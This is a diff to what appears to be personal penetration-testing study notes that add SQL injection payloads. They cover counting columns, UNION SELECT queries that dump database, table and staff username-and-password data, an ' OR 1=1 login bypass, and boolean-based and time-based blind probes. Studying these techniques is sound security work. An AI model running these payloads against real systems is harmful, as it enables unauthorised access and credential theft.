@@ -106,8 +106,9 @@ Use ";" to chain syscall.
 
 ## SQL Injection
 
-### In-Band SQL
+### In-Band SQLi
 
+First we have to check how many columns there are to select : select 1 -> select 1,2 -> select 1,2,3 ....    
     0 UNION SELECT 1,2,database()  (database() returns the name of the database) 
 
 Once we know the name of the database, we get the tables of the database
@@ -122,5 +123,14 @@ Then display the content:
 
     0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users (where 'username' and 'password' are column names)
 
+### Blind SQLi (the thing before union must be false so that we can check that our query works or not)
 
+#### Authentication bypass 
 
+    ' OR 1=1;--
+#### Boolean based
+
+    admin123' UNION SELECT 1,2,3 where database() like '%';-- (discover the name on a boolean base database, add character before % and see if the database returns true or not)
+#### Time based
+
+    admin123' UNION SELECT SLEEP(5);--  
